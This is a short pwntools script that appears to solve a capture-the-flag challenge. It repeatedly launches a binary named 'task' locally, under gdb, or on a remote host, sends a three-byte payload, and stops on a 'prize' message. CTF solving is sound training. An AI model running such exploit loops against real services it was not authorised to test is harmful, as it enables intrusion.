from pwn import *

elf = ELF('./task')

for _ in range(0x100):
	if args.GDB:
		p = gdb.debug(elf.path, '\n'.join([
			"b *main",
			"c"
		]))
	elif args.REMOTE:
		host, port = args.get("HOST", "localhost"), args.get("PORT", 5000)
		p = remote(host, port)
	else:
		p = process(elf.path) 

	payload = b'aa' + p8(0)
	p.send(payload)

	data = p.stream()
	if b'Here is your prize' in data:
		print(data)
		break
